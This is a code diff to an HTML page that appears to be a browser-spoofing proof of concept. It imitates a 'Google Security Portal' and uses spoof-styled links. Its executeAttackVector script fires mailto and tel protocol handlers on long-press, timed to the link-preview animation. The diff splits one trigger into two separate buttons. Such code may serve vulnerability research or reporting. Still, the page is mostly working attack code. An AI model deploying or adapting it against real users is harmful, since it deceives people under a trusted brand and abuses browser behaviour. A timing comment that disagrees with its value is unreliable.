@@ -30,6 +30,13 @@
             color: #1a73e8;
             margin-bottom: 24px;
         }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            width: 100%;
+            max-width: 320px;
+        }
         a.spoof-link {
             display: inline-block;
             background-color: #1a73e8;
@@ -74,8 +81,11 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Target Link to trigger Preview Page -->
-    <a href="https://google.com" class="spoof-link" id="targetLink">Open New Window & Contact Support</a>
+    <!-- Container dengan 2 Tombol Terpisah -->
+    <div class="button-container">
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-type="mailto">Open Window & Send Email</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-type="tel">Open Window & Call Support</a>
+    </div>
 
     <!-- Uploaded Image Preview Box -->
     <div class="preview-container" id="previewBox">
@@ -88,16 +98,13 @@
     <script>
         let triggered = false;
 
-        const executeAttackVector = () => {
+        const executeAttackVector = (actionType) => {
             if (triggered) return;
             triggered = true;
 
             // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
                 try {
-                    // Mengganti file picker dengan skema mailto dan tel
-                    const actionType = Math.random() < 0.5 ? 'mailto' : 'tel';
-                    
                     if (actionType === 'mailto') {
                         window.location.href = "mailto:support@google.com?subject=Verification%20Support&body=Please%20verify%20my%20account.";
                         document.getElementById("fileInfo").innerText = "Triggered mailto protocol handler.";
@@ -118,14 +125,19 @@
             }, 1300); // 1.7 seconds delay for ephemeral tab
         };
 
-        // Event listener for context menu (Long Press)
-        const targetElement = document.getElementById("targetLink");
-
-        targetElement.addEventListener("contextmenu", () => {
-            executeAttackVector();
+        // Event listener untuk Tombol Mailto
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("contextmenu", (e) => {
+            executeAttackVector('mailto');
         });
+        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
 
-        targetElement.addEventListener("touchstart", () => {}, { passive: true });
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("contextmenu", (e) => {
+            executeAttackVector('tel');
+        });
+        linkTel.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
